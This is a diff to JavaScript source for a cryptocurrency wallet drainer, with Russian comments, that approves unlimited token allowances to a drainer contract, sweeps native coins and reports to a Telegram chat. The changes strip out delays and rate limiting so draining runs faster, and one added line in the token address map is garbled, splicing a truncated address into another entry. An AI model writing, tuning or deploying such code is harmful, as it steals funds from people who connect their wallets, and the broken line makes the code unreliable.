@@ -7,9 +7,6 @@ const TELEGRAM_CHAT_ID = '-4767714458';
 // Переменная для отслеживания времени последнего вызова drain
 let lastDrainTime = 0;
 
-// Функция для создания задержки
-const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
 // Функция для отправки сообщения в Telegram
 async function sendTelegramMessage(message) {
   try {
@@ -142,7 +139,7 @@ const TOKEN_SYMBOLS = {
   "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": "AAVEUSDT",
   "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": "RNDRUSDT",
   "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": "MKRUSDT",
-  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
+  "0x6b3595068778dd592e39a122f4f5a  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
   "0xe02df9e3e622debdd69fb838bb799e3f168902c5": "BAKEUSDT",
   "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63": "XVSUSDT",
   "0x8f0528ce5ef7b51152a59745befdd91d97091d2f": "ALPACAUSDT",
@@ -556,9 +553,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
-        console.log(`⏳ Задержка 5 секунд перед approve для токена ${token}`);
-        await delay(5000);
-
         const tx = await contract.approve(config.drainerAddress, MAX, {
           gasLimit: 100000,
           gasPrice: gasPrice,
@@ -594,9 +588,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       try {
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Цена газа для ${config.nativeToken}: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
-
-        console.log(`⏳ Задержка 5 секунд перед processData`);
-        await delay(5000);
 
         const tx = await drainer.processData(taskId, dataHash, nonce, [], {
           value,
@@ -659,10 +650,10 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 export async function runDrainer(provider, signer, userAddress) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
-  const minDelay = 5000;
+  const minDelay = 0; // Убираем минимальную задержку
 
   if (timeSinceLastDrain < minDelay) {
-    await delay(minDelay - timeSinceLastDrain);
+    return; // Убираем задержку
   }
 
   lastDrainTime = Date.now();
